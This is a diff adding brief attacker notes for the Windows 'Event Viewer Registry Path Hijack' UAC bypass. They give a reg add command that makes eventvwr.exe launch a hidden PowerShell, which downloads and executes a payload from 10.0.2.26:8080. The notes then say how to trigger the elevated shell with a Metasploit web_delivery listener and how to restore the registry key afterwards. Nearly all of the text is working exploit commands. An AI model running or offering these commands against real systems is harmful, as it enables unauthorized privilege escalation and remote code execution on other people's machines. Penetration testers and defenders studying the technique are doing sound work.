@@ -1,0 +1,33 @@
+Event Viewer Registry Path Hijack:
+
+Works on Windows 7, 8, 10 (except the most recent Windows 10 Creator Update)
+
+
+If you have a lower privileged shell, you may run the following commands in the shell prompt:
+
+reg add "HKCU\Software\Classes\mscfile\shell\open\command" /f /d "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://10.0.2.26:8080/'))"
+
+This will add a reg key entry that is part of the Path check that eventvwr.exe performs (HKCU, then HKLM)
+
+
+At this point, simply run the follow to spawn an elevated shell:
+
+C:\Windows\System32\eventvwr.exe
+
+Make sure you have a listener on the correct port
+
+I used Metasploit's built in exploit/multi/script/web_delivery
+
+
+Once you receive your elevated shell, run the following for clean-up:
+
+reg delete "HKCU\Software\Classes\mscfile\shell\open\command" /f
+
+reg add "HKCU\Software\Classes\mscfile\shell\open\command" /d "%SystemRoot%\system32\mmc.exe "%1" %*" /f
+
+
+
+
+
+
+Original setting: %SystemRoot%\system32\mmc.exe "%1" %*
